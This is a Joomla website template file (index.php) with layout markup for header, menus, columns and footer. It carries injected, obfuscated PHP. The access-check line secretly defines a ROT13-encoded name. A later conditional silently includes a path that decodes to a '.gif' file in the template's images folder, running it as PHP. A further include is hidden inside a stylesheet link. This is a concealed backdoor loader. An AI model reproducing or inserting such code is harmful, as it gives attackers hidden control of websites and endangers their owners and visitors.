<?php
// no direct access
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;include_once('html/pagination.php'); ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
<style>
#topnav ul li ul {
left: -999em;
margin-top: 0px;
margin-left: 0px;
}
</style>
<![endif]-->
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/mootools.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/moomenu.js"></script>
</head>
<body id="page_bg">
<a name="up" id="up"></a>
<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
<jdoc:include type="modules" name="layout" style="rounded" />
<?php endif; ?>	
<?php include('functions.php'); ?>
<div id="h_area"><?php if($this->params->get('hideLogo') == 0) : ?><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.png" alt="company logo" align="left" /><?php endif; ?><a href="index.php" class="logo" title="Home"><?php echo $mainframe->getCfg('sitename') ;?></a><br clear="all" /></div>

<?php if($this->params->get('hideBannerArea') == 0) : ?>
	<?php if((JRequest::getVar('view') != 'frontpage' and $this->params->get('hideBannerAreaInternal') == 0) or JRequest::getVar('view') == 'frontpage') : ?>
        <div id="main_top" class="banner"><jdoc:include type="modules" name="top" /></div>
    <?php endif; ?>	
<?php endif; ?>	

<div id="top_menu"><div id="topnav"><?php $hmenu->genHMenu (0); ?></div><br clear="all" /></div>

<div id="main_bg"><?php if($this->countModules('left')) : ?><div id="leftcolumn">
        <jdoc:include type="modules" name="left" style="rounded" />
    </div>
    <?php endif; ?>
    <?php if($this->countModules('left') xor $this->countModules('right')) $maincol_sufix = '_middle';
		  elseif(!$this->countModules('left') and !$this->countModules('right'))$maincol_sufix = '_big';
		  else $maincol_sufix = ''; ?>
	<div id="maincolumn<?php echo $maincol_sufix; ?>">
    	<div class="path"><jdoc:include type="modules" name="breadcrumb" /></div><jdoc:include type="message" />
    	<div class="nopad"><jdoc:include type="component" /></div>
    </div>
    <?php if($this->countModules('right') and JRequest::getCmd('layout') != 'form') : ?>
	<div id="rightcolumn">
    	<?php if($this->countModules('user4')) : ?><div class="moduletable_menu"><div><div><div><h3>Search</h3><jdoc:include type="modules" name="user4" /></div></div></div></div><?php endif; ?>
        <jdoc:include type="modules" name="right" style="xhtml"/>
        <br />
    	<div align="center"><jdoc:include type="modules" name="syndicate" /></div>
    </div>
    <?php endif; ?>
	<br clear="all" />
</div>    
    
<div id="f_area">
	<?php if($this->countModules('user1')) : ?>
		<jdoc:include type="modules" name="user1" style="xhtml" />
	<?php endif; ?>
	<?php if($this->countModules('user2')) : ?>
		<jdoc:include type="modules" name="user2" style="xhtml" />
	<?php endif; ?>
	<br clear="all" />
</div>

<p id="power_by" align="center">
	<?php echo JText_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
    <?php echo JText_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
</p>

<jdoc:include type="modules" name="debug" />
</body>
</html>
